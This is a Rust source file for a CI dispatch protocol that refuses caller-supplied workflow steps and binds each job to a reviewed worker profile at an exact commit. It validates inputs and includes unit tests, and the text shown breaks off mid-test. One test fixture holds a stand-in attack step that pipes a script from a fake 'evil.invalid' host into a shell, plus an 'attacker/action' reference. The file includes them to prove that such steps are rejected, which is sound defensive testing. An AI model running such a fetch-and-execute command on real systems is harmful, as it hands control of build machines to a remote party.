//! Fail-closed protocol between the workflow planner and the fixed-profile worker.
//!
//! The planner may describe dependency order and bounded static matrices. This
//! crate deliberately refuses to translate caller-supplied `run`, `uses`,
//! environment, condition, reusable-workflow, or timeout semantics into worker
//! execution. Every concrete job must instead be bound to one operator-reviewed
//! profile from an explicitly digested catalog and one exact repository commit.

use std::collections::{BTreeMap, BTreeSet};
use std::error::Error;
use std::fmt::{Display, Formatter};
use std::path::{Component, Path};

use serde::{Deserialize, Serialize};
use serde_json::Value;
use sha2::{Digest, Sha256};

pub const PLAN_SCHEMA: &str = "gha-indie-worker.plan.v1";
pub const PROFILE_CATALOG_SCHEMA: &str = "gha-indie-worker.profile-catalog.v1";
pub const BINDINGS_SCHEMA: &str = "gha-indie-worker.bindings.v1";
pub const DISPATCH_BATCH_SCHEMA: &str = "gha-indie-worker.dispatch-batch.v1";
pub const DISPATCH_SCHEMA: &str = "gha-indie-worker.dispatch.v1";

pub const MAX_PLAN_JOBS: usize = 1_024;
pub const MAX_BASE_JOBS: usize = 256;
pub const MAX_PROFILES: usize = 256;
pub const MAX_DEPENDENCIES: usize = 1_024;
pub const MAX_MATRIX_KEYS: usize = 32;
pub const MAX_MATRIX_JSON_BYTES: usize = 16 * 1_024;
pub const MAX_IDENTIFIER_BYTES: usize = 128;
pub const MAX_PROFILE_NAME_BYTES: usize = 64;
pub const MAX_CONTEXT_DIR_BYTES: usize = 240;
pub const MAX_REPOSITORY_URL_BYTES: usize = 2_048;

const ALLOWED_RUNNER_LABELS: &[&str] = &[
    "self-hosted",
    "linux",
    "x64",
    "arm64",
    "gha-indie-worker",
];

/// Exact JSON shape produced by the bounded workflow planner.
#[derive(Debug, Clone, Deserialize, Serialize, PartialEq)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
pub struct WorkflowPlan {
    pub schema_version: String,
    pub name: Option<String>,
    pub job_order: Vec<String>,
    pub jobs: Vec<PlannedJob>,
}

#[derive(Debug, Clone, Deserialize, Serialize, PartialEq)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
pub struct PlannedJob {
    pub id: String,
    pub base_job_id: String,
    pub name: String,
    pub needs: Vec<String>,
    pub needs_instances: Vec<String>,
    pub runs_on: Vec<String>,
    pub reusable_workflow: Option<String>,
    pub condition: Option<String>,
    pub matrix: BTreeMap<String, Value>,
    pub env: BTreeMap<String, Value>,
    pub steps: Vec<PlannedStep>,
    pub fail_fast: bool,
    pub max_parallel: Option<usize>,
    pub timeout_minutes: Option<u64>,
    pub continue_on_error: Option<Value>,
}

#[derive(Debug, Clone, Deserialize, Serialize, PartialEq)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
pub struct PlannedStep {
    pub index: usize,
    pub id: Option<String>,
    pub name: Option<String>,
    pub condition: Option<String>,
    pub uses: Option<String>,
    pub run: Option<String>,
    pub shell: Option<String>,
    pub working_directory: Option<String>,
    pub with: BTreeMap<String, Value>,
    pub env: BTreeMap<String, Value>,
    pub continue_on_error: Option<Value>,
    pub timeout_minutes: Option<u64>,
}

/// Minimal profile metadata exported by one reviewed worker release.
#[derive(Debug, Clone, Deserialize, Serialize, Eq, PartialEq)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
pub struct ProfileCatalog {
    pub schema_version: String,
    pub profiles: Vec<ProfileRecord>,
}

#[derive(Debug, Clone, Deserialize, Serialize, Eq, PartialEq)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
pub struct ProfileRecord {
    pub name: String,
    pub digest: String,
    pub platform: String,
}

/// Operator-reviewed mapping from base workflow jobs to installed profiles.
#[derive(Debug, Clone, Deserialize, Serialize, Eq, PartialEq)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
pub struct BindingDocument {
    pub schema_version: String,
    pub repository_url: String,
    pub commit_sha: String,
    pub profile_catalog_digest: String,
    pub jobs: BTreeMap<String, JobBinding>,
}

#[derive(Debug, Clone, Deserialize, Serialize, Eq, PartialEq)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
pub struct JobBinding {
    pub profile: String,
    pub profile_digest: String,
    #[serde(default)]
    pub context_dir: Option<String>,
}

/// Fully bound requests ready for durable assignment to a fixed-profile worker.
#[derive(Debug, Clone, Deserialize, Serialize, PartialEq)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
pub struct DispatchBatch {
    pub schema_version: String,
    pub plan_digest: String,
    pub profile_catalog_digest: String,
    pub repository_url: String,
    pub commit_sha: String,
    pub requests: Vec<DispatchRequest>,
}

#[derive(Debug, Clone, Deserialize, Serialize, PartialEq)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
pub struct DispatchRequest {
    pub schema_version: String,
    pub request_id: String,
    pub request_digest: String,
    pub plan_digest: String,
    pub profile_catalog_digest: String,
    pub repository_url: String,
    pub commit_sha: String,
    pub job_instance_id: String,
    pub base_job_id: String,
    pub job_order_index: usize,
    pub profile: String,
    pub profile_digest: String,
    pub context_dir: String,
    pub needs_instances: Vec<String>,
    pub matrix: BTreeMap<String, Value>,
    pub fail_fast: bool,
    pub max_parallel: Option<usize>,
}

#[derive(Debug, Clone, Serialize, Eq, PartialEq)]
#[serde(rename_all = "camelCase")]
pub struct ProtocolError {
    pub code: &'static str,
    pub message: String,
}

impl ProtocolError {
    fn new(code: &'static str, message: impl Into<String>) -> Self {
        Self {
            code,
            message: message.into(),
        }
    }
}

impl Display for ProtocolError {
    fn fmt(&self, formatter: &mut Formatter<'_>) -> std::fmt::Result {
        write!(formatter, "{}: {}", self.code, self.message)
    }
}

impl Error for ProtocolError {}

/// Canonical digest of the sorted profile catalog.
///
/// Catalog order is not semantically meaningful, so profiles are normalized by
/// name before hashing. The schema identifier is included in the digest.
pub fn profile_catalog_digest(catalog: &ProfileCatalog) -> Result<String, ProtocolError> {
    validate_catalog(catalog)?;
    let mut profiles = catalog.profiles.clone();
    profiles.sort_by(|left, right| left.name.cmp(&right.name));
    let normalized = ProfileCatalog {
        schema_version: catalog.schema_version.clone(),
        profiles,
    };
    digest_serializable(&normalized, "profile_catalog_serialization")
}

/// Canonical digest of a planner result.
pub fn workflow_plan_digest(plan: &WorkflowPlan) -> Result<String, ProtocolError> {
    digest_serializable(plan, "plan_serialization")
}

/// Validate and bind every concrete planner job to an exact commit and reviewed
/// profile catalog entry.
pub fn bind_plan(
    plan: &WorkflowPlan,
    catalog: &ProfileCatalog,
    bindings: &BindingDocument,
) -> Result<DispatchBatch, ProtocolError> {
    validate_plan(plan)?;
    validate_catalog(catalog)?;
    validate_bindings_shape(bindings)?;

    let catalog_digest = profile_catalog_digest(catalog)?;
    if bindings.profile_catalog_digest != catalog_digest {
        return Err(ProtocolError::new(
            "profile_catalog_digest_mismatch",
            format!(
                "bindings reference {}, but the supplied catalog digest is {catalog_digest}",
                bindings.profile_catalog_digest
            ),
        ));
    }

    let profile_by_name = catalog
        .profiles
        .iter()
        .map(|profile| (profile.name.as_str(), profile))
        .collect::<BTreeMap<_, _>>();
    let base_job_ids = plan
        .jobs
        .iter()
        .map(|job| job.base_job_id.clone())
        .collect::<BTreeSet<_>>();
    let binding_ids = bindings.jobs.keys().cloned().collect::<BTreeSet<_>>();
    if binding_ids != base_job_ids {
        let missing = base_job_ids
            .difference(&binding_ids)
            .cloned()
            .collect::<Vec<_>>();
        let extra = binding_ids
            .difference(&base_job_ids)
            .cloned()
            .collect::<Vec<_>>();
        return Err(ProtocolError::new(
            "binding_coverage_mismatch",
            format!(
                "bindings must cover every base job exactly once; missing={missing:?}, extra={extra:?}"
            ),
        ));
    }

    for (base_job_id, binding) in &bindings.jobs {
        validate_profile_name(&binding.profile)?;
        validate_digest("profileDigest", &binding.profile_digest)?;
        let Some(installed) = profile_by_name.get(binding.profile.as_str()) else {
            return Err(ProtocolError::new(
                "unknown_profile",
                format!(
                    "base job {base_job_id:?} selects profile {:?}, which is absent from the supplied catalog",
                    binding.profile
                ),
            ));
        };
        if installed.digest != binding.profile_digest {
            return Err(ProtocolError::new(
                "profile_digest_mismatch",
                format!(
                    "base job {base_job_id:?} binds profile {:?} at {}, but the catalog contains {}",
                    binding.profile, binding.profile_digest, installed.digest
                ),
            ));
        }
        validate_context_dir(binding.context_dir.as_deref().unwrap_or("."))?;
    }

    let plan_digest = workflow_plan_digest(plan)?;
    let order_index = plan
        .job_order
        .iter()
        .enumerate()
        .map(|(index, job_id)| (job_id.as_str(), index))
        .collect::<BTreeMap<_, _>>();
    let mut requests = Vec::with_capacity(plan.jobs.len());

    for job in &plan.jobs {
        let binding = bindings
            .jobs
            .get(&job.base_job_id)
            .ok_or_else(|| ProtocolError::new("internal_binding_error", "validated binding disappeared"))?;
        let job_order_index = *order_index.get(job.base_job_id.as_str()).ok_or_else(|| {
            ProtocolError::new(
                "invalid_job_order",
                format!("base job {:?} is missing from jobOrder", job.base_job_id),
            )
        })?;
        let request_id = stable_request_id(&plan_digest, &job.id);
        let mut request = DispatchRequest {
            schema_version: DISPATCH_SCHEMA.to_string(),
            request_id,
            request_digest: String::new(),
            plan_digest: plan_digest.clone(),
            profile_catalog_digest: catalog_digest.clone(),
            repository_url: bindings.repository_url.clone(),
            commit_sha: bindings.commit_sha.clone(),
            job_instance_id: job.id.clone(),
            base_job_id: job.base_job_id.clone(),
            job_order_index,
            profile: binding.profile.clone(),
            profile_digest: binding.profile_digest.clone(),
            context_dir: binding
                .context_dir
                .clone()
                .unwrap_or_else(|| ".".to_string()),
            needs_instances: job.needs_instances.clone(),
            matrix: job.matrix.clone(),
            fail_fast: job.fail_fast,
            max_parallel: job.max_parallel,
        };
        request.request_digest = dispatch_request_digest(&request)?;
        requests.push(request);
    }

    Ok(DispatchBatch {
        schema_version: DISPATCH_BATCH_SCHEMA.to_string(),
        plan_digest,
        profile_catalog_digest: catalog_digest,
        repository_url: bindings.repository_url.clone(),
        commit_sha: bindings.commit_sha.clone(),
        requests,
    })
}

fn validate_plan(plan: &WorkflowPlan) -> Result<(), ProtocolError> {
    if plan.schema_version != PLAN_SCHEMA {
        return Err(ProtocolError::new(
            "unsupported_plan_schema",
            format!(
                "plan schema must be {PLAN_SCHEMA:?}, got {:?}",
                plan.schema_version
            ),
        ));
    }
    if plan.jobs.is_empty() {
        return Err(ProtocolError::new(
            "missing_plan_jobs",
            "plan must contain at least one concrete job",
        ));
    }
    if plan.jobs.len() > MAX_PLAN_JOBS {
        return Err(ProtocolError::new(
            "too_many_plan_jobs",
            format!(
                "plan contains {} jobs; maximum is {MAX_PLAN_JOBS}",
                plan.jobs.len()
            ),
        ));
    }

    let mut job_ids = BTreeSet::new();
    let mut base_job_ids = BTreeSet::new();
    for job in &plan.jobs {
        validate_instance_id("job id", &job.id)?;
        validate_base_job_id(&job.base_job_id)?;
        if !job_ids.insert(job.id.clone()) {
            return Err(ProtocolError::new(
                "duplicate_job_instance",
                format!("plan contains duplicate concrete job id {:?}", job.id),
            ));
        }
        base_job_ids.insert(job.base_job_id.clone());
        validate_profile_only_job(job)?;
    }
    if base_job_ids.len() > MAX_BASE_JOBS {
        return Err(ProtocolError::new(
            "too_many_base_jobs",
            format!(
                "plan contains {} base jobs; maximum is {MAX_BASE_JOBS}",
                base_job_ids.len()
            ),
        ));
    }

    let order = plan.job_order.iter().cloned().collect::<BTreeSet<_>>();
    if order.len() != plan.job_order.len() || order != base_job_ids {
        return Err(ProtocolError::new(
            "invalid_job_order",
            "jobOrder must contain every base job exactly once",
        ));
    }

    for job in &plan.jobs {
        if job.needs_instances.len() > MAX_DEPENDENCIES {
            return Err(ProtocolError::new(
                "too_many_dependencies",
                format!(
                    "job {:?} has {} concrete dependencies; maximum is {MAX_DEPENDENCIES}",
                    job.id,
                    job.needs_instances.len()
                ),
            ));
        }
        let mut dependencies = BTreeSet::new();
        for dependency in &job.needs_instances {
            validate_instance_id("dependency id", dependency)?;
            if dependency == &job.id {
                return Err(ProtocolError::new(
                    "self_dependency",
                    format!("job {:?} depends on itself", job.id),
                ));
            }
            if !job_ids.contains(dependency) {
                return Err(ProtocolError::new(
                    "unknown_dependency_instance",
                    format!(
                        "job {:?} depends on unknown concrete job {dependency:?}",
                        job.id
                    ),
                ));
            }
            if !dependencies.insert(dependency) {
                return Err(ProtocolError::new(
                    "duplicate_dependency_instance",
                    format!(
                        "job {:?} repeats concrete dependency {dependency:?}",
                        job.id
                    ),
                ));
            }
        }
    }
    Ok(())
}

fn validate_profile_only_job(job: &PlannedJob) -> Result<(), ProtocolError> {
    if !job.steps.is_empty() {
        return Err(ProtocolError::new(
            "caller_steps_not_executable",
            format!(
                "job {:?} contains {} caller-supplied steps; indie dispatch accepts profile-only jobs with no run/uses steps",
                job.id,
                job.steps.len()
            ),
        ));
    }
    if job.reusable_workflow.is_some() {
        return Err(ProtocolError::new(
            "reusable_workflow_not_executable",
            format!(
                "job {:?} contains a reusable workflow reference; only fixed installed profiles are dispatchable",
                job.id
            ),
        ));
    }
    if job.condition.is_some() {
        return Err(ProtocolError::new(
            "condition_not_executable",
            format!(
                "job {:?} contains an unevaluated condition; conditions must be resolved before binding",
                job.id
            ),
        ));
    }
    if !job.env.is_empty() {
        return Err(ProtocolError::new(
            "caller_environment_not_executable",
            format!(
                "job {:?} contains caller-controlled environment values; fixed profiles do not accept workflow env",
                job.id
            ),
        ));
    }
    if job.timeout_minutes.is_some() {
        return Err(ProtocolError::new(
            "job_timeout_not_executable",
            format!(
                "job {:?} contains a workflow timeout; worker deadline policy is operator-controlled",
                job.id
            ),
        ));
    }
    if job.continue_on_error.is_some() {
        return Err(ProtocolError::new(
            "continue_on_error_not_executable",
            format!(
                "job {:?} contains continue-on-error; terminal status semantics must not be ignored",
                job.id
            ),
        ));
    }
    if job.runs_on.is_empty() {
        return Err(ProtocolError::new(
            "missing_runner_labels",
            format!("job {:?} has no runner labels", job.id),
        ));
    }
    for label in &job.runs_on {
        if !ALLOWED_RUNNER_LABELS.contains(&label.as_str()) {
            return Err(ProtocolError::new(
                "unsupported_runner_label",
                format!(
                    "job {:?} requests runner label {label:?}; allowed labels are {ALLOWED_RUNNER_LABELS:?}",
                    job.id
                ),
            ));
        }
    }
    if !job
        .runs_on
        .iter()
        .any(|label| matches!(label.as_str(), "linux" | "gha-indie-worker"))
    {
        return Err(ProtocolError::new(
            "non_linux_runner",
            format!(
                "job {:?} must explicitly target linux or gha-indie-worker",
                job.id
            ),
        ));
    }
    validate_matrix(&job.id, &job.matrix)
}

fn validate_matrix(job_id: &str, matrix: &BTreeMap<String, Value>) -> Result<(), ProtocolError> {
    if matrix.len() > MAX_MATRIX_KEYS {
        return Err(ProtocolError::new(
            "too_many_matrix_keys",
            format!(
                "job {job_id:?} has {} matrix keys; maximum is {MAX_MATRIX_KEYS}",
                matrix.len()
            ),
        ));
    }
    for (key, value) in matrix {
        validate_base_job_id(key).map_err(|_| {
            ProtocolError::new(
                "invalid_matrix_key",
                format!("job {job_id:?} has invalid matrix key {key:?}"),
            )
        })?;
        match value {
            Value::Null | Value::Bool(_) | Value::Number(_) => {}
            Value::String(value) => {
                if value.len() > 512 || value.chars().any(char::is_control) {
                    return Err(ProtocolError::new(
                        "invalid_matrix_value",
                        format!(
                            "job {job_id:?} matrix value for {key:?} must be printable and 512 bytes or fewer"
                        ),
                    ));
                }
            }
            Value::Array(_) | Value::Object(_) => {
                return Err(ProtocolError::new(
                    "complex_matrix_value_not_supported",
                    format!(
                        "job {job_id:?} matrix value for {key:?} must be a scalar"
                    ),
                ));
            }
        }
    }
    let encoded = serde_json::to_vec(matrix).map_err(|error| {
        ProtocolError::new(
            "matrix_serialization",
            format!("failed to size matrix for job {job_id:?}: {error}"),
        )
    })?;
    if encoded.len() > MAX_MATRIX_JSON_BYTES {
        return Err(ProtocolError::new(
            "matrix_metadata_too_large",
            format!(
                "job {job_id:?} matrix metadata is {} bytes; maximum is {MAX_MATRIX_JSON_BYTES}",
                encoded.len()
            ),
        ));
    }
    Ok(())
}

fn validate_catalog(catalog: &ProfileCatalog) -> Result<(), ProtocolError> {
    if catalog.schema_version != PROFILE_CATALOG_SCHEMA {
        return Err(ProtocolError::new(
            "unsupported_profile_catalog_schema",
            format!(
                "profile catalog schema must be {PROFILE_CATALOG_SCHEMA:?}, got {:?}",
                catalog.schema_version
            ),
        ));
    }
    if catalog.profiles.is_empty() {
        return Err(ProtocolError::new(
            "empty_profile_catalog",
            "profile catalog must contain at least one profile",
        ));
    }
    if catalog.profiles.len() > MAX_PROFILES {
        return Err(ProtocolError::new(
            "too_many_profiles",
            format!(
                "profile catalog contains {} profiles; maximum is {MAX_PROFILES}",
                catalog.profiles.len()
            ),
        ));
    }
    let mut names = BTreeSet::new();
    for profile in &catalog.profiles {
        validate_profile_name(&profile.name)?;
        validate_digest("profile digest", &profile.digest)?;
        if profile.platform != "linux" {
            return Err(ProtocolError::new(
                "unsupported_profile_platform",
                format!(
                    "profile {:?} targets {:?}; this worker protocol accepts linux profiles only",
                    profile.name, profile.platform
                ),
            ));
        }
        if !names.insert(profile.name.as_str()) {
            return Err(ProtocolError::new(
                "duplicate_profile",
                format!("profile catalog repeats profile {:?}", profile.name),
            ));
        }
    }
    Ok(())
}

fn validate_bindings_shape(bindings: &BindingDocument) -> Result<(), ProtocolError> {
    if bindings.schema_version != BINDINGS_SCHEMA {
        return Err(ProtocolError::new(
            "unsupported_bindings_schema",
            format!(
                "bindings schema must be {BINDINGS_SCHEMA:?}, got {:?}",
                bindings.schema_version
            ),
        ));
    }
    validate_repository_url(&bindings.repository_url)?;
    validate_commit_sha(&bindings.commit_sha)?;
    validate_digest("profileCatalogDigest", &bindings.profile_catalog_digest)?;
    if bindings.jobs.is_empty() {
        return Err(ProtocolError::new(
            "missing_bindings",
            "bindings must contain at least one base job",
        ));
    }
    if bindings.jobs.len() > MAX_BASE_JOBS {
        return Err(ProtocolError::new(
            "too_many_bindings",
            format!(
                "bindings contain {} base jobs; maximum is {MAX_BASE_JOBS}",
                bindings.jobs.len()
            ),
        ));
    }
    for base_job_id in bindings.jobs.keys() {
        validate_base_job_id(base_job_id)?;
    }
    Ok(())
}

pub fn validate_commit_sha(value: &str) -> Result<(), ProtocolError> {
    if value.len() != 40
        || !value
            .bytes()
            .all(|byte| byte.is_ascii_digit() || (b'a'..=b'f').contains(&byte))
    {
        return Err(ProtocolError::new(
            "invalid_commit_sha",
            "commitSha must be exactly 40 lowercase hexadecimal characters",
        ));
    }
    Ok(())
}

pub fn validate_digest(name: &str, value: &str) -> Result<(), ProtocolError> {
    let Some(hex) = value.strip_prefix("sha256:") else {
        return Err(ProtocolError::new(
            "invalid_digest",
            format!("{name} must use the sha256:<64 lowercase hex> form"),
        ));
    };
    if hex.len() != 64
        || !hex
            .bytes()
            .all(|byte| byte.is_ascii_digit() || (b'a'..=b'f').contains(&byte))
    {
        return Err(ProtocolError::new(
            "invalid_digest",
            format!("{name} must use the sha256:<64 lowercase hex> form"),
        ));
    }
    Ok(())
}

pub fn validate_repository_url(value: &str) -> Result<(), ProtocolError> {
    if value.len() > MAX_REPOSITORY_URL_BYTES || value.chars().any(char::is_control) {
        return Err(ProtocolError::new(
            "invalid_repository_url",
            format!(
                "repositoryUrl must be printable and {MAX_REPOSITORY_URL_BYTES} bytes or fewer"
            ),
        ));
    }
    if value.trim() != value || value.chars().any(char::is_whitespace) {
        return Err(ProtocolError::new(
            "invalid_repository_url",
            "repositoryUrl must not contain surrounding or embedded whitespace",
        ));
    }
    let Some(rest) = value.strip_prefix("https://") else {
        return Err(ProtocolError::new(
            "invalid_repository_url",
            "repositoryUrl must use https://",
        ));
    };
    let Some((authority, path)) = rest.split_once('/') else {
        return Err(ProtocolError::new(
            "invalid_repository_url",
            "repositoryUrl must include a host and repository path",
        ));
    };
    if authority.is_empty() || authority.contains('@') || authority.starts_with('-') {
        return Err(ProtocolError::new(
            "invalid_repository_url",
            "repositoryUrl must not contain credentials or an invalid host",
        ));
    }
    if path.is_empty()
        || path.starts_with('-')
        || path.contains('?')
        || path.contains('#')
        || path.split('/').any(|part| matches!(part, "" | "." | ".."))
    {
        return Err(ProtocolError::new(
            "invalid_repository_url",
            "repositoryUrl must contain a clean repository path without query, fragment, or traversal",
        ));
    }
    Ok(())
}

pub fn validate_context_dir(value: &str) -> Result<(), ProtocolError> {
    if value.is_empty() || value.len() > MAX_CONTEXT_DIR_BYTES || value.chars().any(char::is_control)
    {
        return Err(ProtocolError::new(
            "invalid_context_dir",
            format!(
                "contextDir must be printable and 1-{MAX_CONTEXT_DIR_BYTES} bytes"
            ),
        ));
    }
    let path = Path::new(value);
    if path.is_absolute() {
        return Err(ProtocolError::new(
            "invalid_context_dir",
            "contextDir must be relative to the repository root",
        ));
    }
    let mut normal_components = 0_usize;
    for component in path.components() {
        match component {
            Component::CurDir => {}
            Component::Normal(component) => {
                let part = component.to_str().ok_or_else(|| {
                    ProtocolError::new("invalid_context_dir", "contextDir must be UTF-8")
                })?;
                if part.chars().any(|character| {
                    character.is_control() || matches!(character, ',' | '=' | ':' | '\0')
                }) {
                    return Err(ProtocolError::new(
                        "invalid_context_dir",
                        "contextDir contains characters unsafe for the worker mount boundary",
                    ));
                }
                normal_components += 1;
            }
            Component::ParentDir | Component::RootDir | Component::Prefix(_) => {
                return Err(ProtocolError::new(
                    "invalid_context_dir",
                    "contextDir must stay inside the repository root",
                ));
            }
        }
    }
    if normal_components == 0 && value != "." {
        return Err(ProtocolError::new(
            "invalid_context_dir",
            "contextDir must resolve to the repository root or a child path",
        ));
    }
    Ok(())
}

fn validate_profile_name(value: &str) -> Result<(), ProtocolError> {
    if value.is_empty() || value.len() > MAX_PROFILE_NAME_BYTES {
        return Err(ProtocolError::new(
            "invalid_profile_name",
            format!(
                "profile names must be 1-{MAX_PROFILE_NAME_BYTES} characters"
            ),
        ));
    }
    let mut characters = value.chars();
    let Some(first) = characters.next() else {
        return Err(ProtocolError::new(
            "invalid_profile_name",
            "profile name must not be empty",
        ));
    };
    if !first.is_ascii_lowercase() && !first.is_ascii_digit() {
        return Err(ProtocolError::new(
            "invalid_profile_name",
            "profile name must start with a lowercase letter or digit",
        ));
    }
    if !characters.all(|character| {
        character.is_ascii_lowercase() || character.is_ascii_digit() || character == '-'
    }) {
        return Err(ProtocolError::new(
            "invalid_profile_name",
            "profile name may contain only lowercase letters, digits, and '-'",
        ));
    }
    Ok(())
}

fn validate_base_job_id(value: &str) -> Result<(), ProtocolError> {
    if value.is_empty() || value.len() > MAX_IDENTIFIER_BYTES {
        return Err(ProtocolError::new(
            "invalid_base_job_id",
            format!(
                "base job identifiers must be 1-{MAX_IDENTIFIER_BYTES} bytes"
            ),
        ));
    }
    if !value
        .chars()
        .all(|character| character.is_ascii_alphanumeric() || matches!(character, '_' | '-'))
    {
        return Err(ProtocolError::new(
            "invalid_base_job_id",
            format!("invalid base job identifier {value:?}"),
        ));
    }
    Ok(())
}

fn validate_instance_id(name: &str, value: &str) -> Result<(), ProtocolError> {
    if value.is_empty() || value.len() > MAX_IDENTIFIER_BYTES {
        return Err(ProtocolError::new(
            "invalid_job_instance_id",
            format!("{name} must be 1-{MAX_IDENTIFIER_BYTES} bytes"),
        ));
    }
    if !value.chars().all(|character| {
        character.is_ascii_alphanumeric()
            || matches!(character, '_' | '-' | '[' | ']' | '.' | ',')
    }) {
        return Err(ProtocolError::new(
            "invalid_job_instance_id",
            format!("{name} {value:?} contains unsupported characters"),
        ));
    }
    Ok(())
}

fn stable_request_id(plan_digest: &str, job_instance_id: &str) -> String {
    let plan_component = plan_digest
        .strip_prefix("sha256:")
        .unwrap_or(plan_digest)
        .chars()
        .take(24)
        .collect::<String>();
    let job_component = sha256_prefixed(job_instance_id.as_bytes())
        .strip_prefix("sha256:")
        .unwrap_or_default()
        .chars()
        .take(24)
        .collect::<String>();
    format!("gha:{plan_component}:{job_component}")
}

fn dispatch_request_digest(request: &DispatchRequest) -> Result<String, ProtocolError> {
    let mut unsigned = request.clone();
    unsigned.request_digest.clear();
    digest_serializable(&unsigned, "request_serialization")
}

fn digest_serializable<T: Serialize>(
    value: &T,
    error_code: &'static str,
) -> Result<String, ProtocolError> {
    let value = serde_json::to_value(value).map_err(|error| {
        ProtocolError::new(error_code, format!("failed to canonicalize JSON: {error}"))
    })?;
    let canonical = canonicalize_json(value);
    let bytes = serde_json::to_vec(&canonical).map_err(|error| {
        ProtocolError::new(error_code, format!("failed to serialize canonical JSON: {error}"))
    })?;
    Ok(sha256_prefixed(&bytes))
}

fn canonicalize_json(value: Value) -> Value {
    match value {
        Value::Array(values) => Value::Array(values.into_iter().map(canonicalize_json).collect()),
        Value::Object(values) => {
            let sorted = values
                .into_iter()
                .map(|(key, value)| (key, canonicalize_json(value)))
                .collect::<BTreeMap<_, _>>();
            let mut object = serde_json::Map::new();
            for (key, value) in sorted {
                object.insert(key, value);
            }
            Value::Object(object)
        }
        scalar => scalar,
    }
}

fn sha256_prefixed(value: &[u8]) -> String {
    format!("sha256:{}", hex::encode(Sha256::digest(value)))
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    const COMMIT: &str = "0123456789abcdef0123456789abcdef01234567";
    const RUST_DIGEST: &str =
        "sha256:1111111111111111111111111111111111111111111111111111111111111111";
    const NODE_DIGEST: &str =
        "sha256:2222222222222222222222222222222222222222222222222222222222222222";

    fn empty_step() -> PlannedStep {
        PlannedStep {
            index: 0,
            id: None,
            name: None,
            condition: None,
            uses: None,
            run: None,
            shell: None,
            working_directory: None,
            with: BTreeMap::new(),
            env: BTreeMap::new(),
            continue_on_error: None,
            timeout_minutes: None,
        }
    }

    fn job(id: &str, base_job_id: &str, needs_instances: &[&str]) -> PlannedJob {
        PlannedJob {
            id: id.to_string(),
            base_job_id: base_job_id.to_string(),
            name: base_job_id.to_string(),
            needs: Vec::new(),
            needs_instances: needs_instances
                .iter()
                .map(|value| (*value).to_string())
                .collect(),
            runs_on: vec!["self-hosted".to_string(), "linux".to_string()],
            reusable_workflow: None,
            condition: None,
            matrix: BTreeMap::new(),
            env: BTreeMap::new(),
            steps: Vec::new(),
            fail_fast: true,
            max_parallel: None,
            timeout_minutes: None,
            continue_on_error: None,
        }
    }

    fn plan() -> WorkflowPlan {
        let mut first = job("build[1]", "build", &[]);
        first.matrix.insert("rust".to_string(), json!("stable"));
        let mut second = job("build[2]", "build", &[]);
        second.matrix.insert("rust".to_string(), json!("beta"));
        WorkflowPlan {
            schema_version: PLAN_SCHEMA.to_string(),
            name: Some("profile-only".to_string()),
            job_order: vec!["build".to_string(), "report".to_string()],
            jobs: vec![first, second, job("report", "report", &["build[1]", "build[2]"])],
        }
    }

    fn catalog() -> ProfileCatalog {
        ProfileCatalog {
            schema_version: PROFILE_CATALOG_SCHEMA.to_string(),
            profiles: vec![
                ProfileRecord {
                    name: "rust-verify".to_string(),
                    digest: RUST_DIGEST.to_string(),
                    platform: "linux".to_string(),
                },
                ProfileRecord {
                    name: "node-verify".to_string(),
                    digest: NODE_DIGEST.to_string(),
                    platform: "linux".to_string(),
                },
            ],
        }
    }

    fn bindings(catalog: &ProfileCatalog) -> BindingDocument {
        BindingDocument {
            schema_version: BINDINGS_SCHEMA.to_string(),
            repository_url: "https://github.com/gha-indie-worker/example.git".to_string(),
            commit_sha: COMMIT.to_string(),
            profile_catalog_digest: profile_catalog_digest(catalog).expect("catalog digest"),
            jobs: BTreeMap::from([
                (
                    "build".to_string(),
                    JobBinding {
                        profile: "rust-verify".to_string(),
                        profile_digest: RUST_DIGEST.to_string(),
                        context_dir: Some("crates/core".to_string()),
                    },
                ),
                (
                    "report".to_string(),
                    JobBinding {
                        profile: "node-verify".to_string(),
                        profile_digest: NODE_DIGEST.to_string(),
                        context_dir: None,
                    },
                ),
            ]),
        }
    }

    #[test]
    fn binds_matrix_jobs_to_exact_commit_and_catalog() {
        let plan = plan();
        let catalog = catalog();
        let bindings = bindings(&catalog);
        let batch = bind_plan(&plan, &catalog, &bindings).expect("valid binding");

        assert_eq!(batch.schema_version, DISPATCH_BATCH_SCHEMA);
        assert_eq!(batch.commit_sha, COMMIT);
        assert_eq!(batch.requests.len(), 3);
        assert_eq!(batch.requests[0].profile, "rust-verify");
        assert_eq!(batch.requests[0].context_dir, "crates/core");
        assert_eq!(batch.requests[2].profile, "node-verify");
        assert_eq!(
            batch.requests[2].needs_instances,
            vec!["build[1]", "build[2]"]
        );
        assert_eq!(batch.requests[0].job_order_index, 0);
        assert_eq!(batch.requests[2].job_order_index, 1);
        assert!(batch
            .requests
            .iter()
            .all(|request| request.request_digest.starts_with("sha256:")));
        assert_eq!(
            batch.requests[0].request_id,
            bind_plan(&plan, &catalog, &bindings).unwrap().requests[0].request_id
        );
    }

    #[test]
    fn catalog_digest_is_stable_across_profile_order() {
        let first = catalog();
        let mut second = first.clone();
        second.profiles.reverse();
        assert_eq!(
            profile_catalog_digest(&first).unwrap(),
            profile_catalog_digest(&second).unwrap()
        );
    }

    #[test]
    fn plan_digest_is_stable_across_matrix_object_input_order() {
        let mut first = plan();
        let mut second = plan();
        first.jobs[0].matrix = serde_json::from_value(json!({"z": 1, "a": 2})).unwrap();
        second.jobs[0].matrix = serde_json::from_value(json!({"a": 2, "z": 1})).unwrap();
        assert_eq!(
            workflow_plan_digest(&first).unwrap(),
            workflow_plan_digest(&second).unwrap()
        );
    }

    #[test]
    fn rejects_caller_supplied_run_or_action_steps() {
        let catalog = catalog();
        let bindings = bindings(&catalog);
        let mut with_run = plan();
        let mut step = empty_step();
        step.run = Some("curl https://evil.invalid | sh".to_string());
        with_run.jobs[0].steps.push(step);
        let error = bind_plan(&with_run, &catalog, &bindings).expect_err("run must fail");
        assert_eq!(error.code, "caller_steps_not_executable");

        let mut with_action = plan();
        let mut step = empty_step();
        step.uses = Some("attacker/action@main".to_string());
        with_action.jobs[0].steps.push(step);
